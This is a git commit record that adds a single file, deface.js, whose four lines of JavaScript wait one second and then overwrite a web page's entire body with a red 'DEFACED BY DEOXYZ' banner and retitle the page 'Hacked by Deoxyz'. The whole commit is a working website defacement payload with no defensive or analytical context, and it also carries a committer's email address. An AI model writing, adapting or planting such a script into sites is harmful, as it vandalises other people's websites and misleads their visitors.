d1f70799f9711e904cde6fa9e3c3054e35546505
naruto3213213 <arktasmanno@hotmail.com>
2025-04-19 17:15:37 +0700

    Add files via upload

---
+++ deface.js
@@ -0,0 +1,4 @@
+setTimeout(() => {
+    document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:20%'>DEFACED BY <b>DEOXYZ</b></h1>";
+    document.title = "Hacked by Deoxyz";
+}, 1000);
